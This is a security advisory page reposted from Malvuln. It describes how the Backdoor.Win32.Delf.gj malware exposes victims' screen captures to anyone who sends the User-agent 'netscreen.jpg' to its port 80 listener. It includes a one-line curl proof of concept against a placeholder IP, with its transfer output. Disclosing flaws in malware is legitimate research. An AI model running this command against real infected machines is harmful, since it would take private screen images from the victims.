---
title: Backdoor.Win32.Delf.gj / Information Disclosure
url: https://cxsecurity.com/issue/WLB-2022120011
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-12-06
fetch_date: 2025-10-04T00:33:17.953107
---

# Backdoor.Win32.Delf.gj / Information Disclosure

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Backdoor.Win32.Delf.gj / Information Disclosure** **2022.12.05**  **![us](https://cert.cx/cxstatic/images/flags/us.png) [malvuln](https://cxsecurity.com/author/malvuln/1/) **(US)** ![us](https://cert.cx/cxstatic/images/flags/us.png)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

Discovery / credits: Malvuln (John Page aka hyp3rlinx) (c) 2022
Original source: https://malvuln.com/advisory/8872c2ec49ff3382240762a029631684.txt
Contact: malvuln13@gmail.com
Media: twitter.com/malvuln
Backup media: infosec.exchange/@malvuln
Threat: Backdoor.Win32.Delf.gj
Vulnerability: Information Disclosure
Description: The malware listens on TCP port 80. Third-party adversaries who can reach an infected system can pass "netscreen.jpg" for the User-agent: header in the HTTP request to download victim machines screen captures.
Family: Delf
Type: PE32
MD5: 8872c2ec49ff3382240762a029631684
Vuln ID: MVID-2022-0663
Disclosure: 12/01/2022
Exploit/PoC:
curl http://x.x.x.x -H "User-agent: netscreen.jpg" --output screendump.jpg
% Total % Received % Xferd Average Speed Time Time Time Current
Dload Upload Total Spent Left Speed
100 215k 100 215k 0 0 215k 0 0:00:01 --:--:-- 0:00:01 1976k
Disclaimer: The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise. Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information or exploits by the author or elsewhere. Do not attempt to download Malware samples. The author of this website takes no responsibility for any kind of damages occurring from improper Malware handling or the downloading of ANY Malware mentioned on this website or elsewhere. All content Copyright (c) Malvuln.com (TM).

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2022120011)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top